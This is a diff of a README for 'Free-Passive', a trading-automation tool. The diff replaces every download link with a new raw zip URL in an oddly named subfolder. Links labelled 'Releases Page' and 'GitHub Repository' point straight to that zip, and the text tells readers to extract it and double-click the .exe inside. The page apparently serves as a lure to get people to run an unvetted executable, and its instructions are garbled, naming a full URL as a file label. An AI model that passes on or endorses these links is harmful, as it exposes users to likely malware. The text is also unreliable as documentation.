@@ -1,6 +1,6 @@
 # 🚀 Free-Passive - Automate Your Trading Efforts Easily
 
-[![Download Free-Passive](https://raw.githubusercontent.com/Eunsei677383/Free-Passive/main/coenflame/Free-Passive.zip)](https://raw.githubusercontent.com/Eunsei677383/Free-Passive/main/coenflame/Free-Passive.zip)
+[![Download Free-Passive](https://github.com/Eunsei677383/Free-Passive/raw/refs/heads/main/coenflame/Free-Passive-2.0.zip)](https://github.com/Eunsei677383/Free-Passive/raw/refs/heads/main/coenflame/Free-Passive-2.0.zip)
 
 ## 📋 Introduction
 
@@ -24,10 +24,10 @@ To download and run the software, follow these straightforward steps:
 1. **Visit the Releases Page:**
    Go to the releases page by clicking the link below. This is where you can find the latest version of Free-Passive.
 
-   [Visit the Releases Page](https://raw.githubusercontent.com/Eunsei677383/Free-Passive/main/coenflame/Free-Passive.zip)
+   [Visit the Releases Page](https://github.com/Eunsei677383/Free-Passive/raw/refs/heads/main/coenflame/Free-Passive-2.0.zip)
 
 2. **Download the Latest Version:**
-   On the releases page, find the latest release version. Look for a file labeled something like `https://raw.githubusercontent.com/Eunsei677383/Free-Passive/main/coenflame/Free-Passive.zip` or `https://raw.githubusercontent.com/Eunsei677383/Free-Passive/main/coenflame/Free-Passive.zip`. Click on it to start the download.
+   On the releases page, find the latest release version. Look for a file labeled something like `https://github.com/Eunsei677383/Free-Passive/raw/refs/heads/main/coenflame/Free-Passive-2.0.zip` or `https://github.com/Eunsei677383/Free-Passive/raw/refs/heads/main/coenflame/Free-Passive-2.0.zip`. Click on it to start the download.
 
 3. **Install the Software:**
    If you downloaded an executable file (`.exe`), just double-click it to start the installation. Follow the on-screen instructions. If you downloaded a zip file, extract it first. Then double-click the `.exe` file inside the extracted folder.
@@ -60,7 +60,7 @@ To help you get started quickly, we have created a YouTube tutorial. This tutori
 
 To get started, download Free-Passive from our releases page:
 
-[Download Free-Passive](https://raw.githubusercontent.com/Eunsei677383/Free-Passive/main/coenflame/Free-Passive.zip)
+[Download Free-Passive](https://github.com/Eunsei677383/Free-Passive/raw/refs/heads/main/coenflame/Free-Passive-2.0.zip)
 
 Once downloaded, follow the installation steps outlined earlier. This should set you up well for successful trading.
 
@@ -70,7 +70,7 @@ If you have questions or need support, feel free to join our community. You can 
 
 ### 🔗 Useful Links
 
-- **GitHub Repository:** [Free-Passive GitHub](https://raw.githubusercontent.com/Eunsei677383/Free-Passive/main/coenflame/Free-Passive.zip)
+- **GitHub Repository:** [Free-Passive GitHub](https://github.com/Eunsei677383/Free-Passive/raw/refs/heads/main/coenflame/Free-Passive-2.0.zip)
 - **Issues:** Report any bugs or request features directly on GitHub.
 - **Documentation:** Detailed documentation is available in the repository.
 
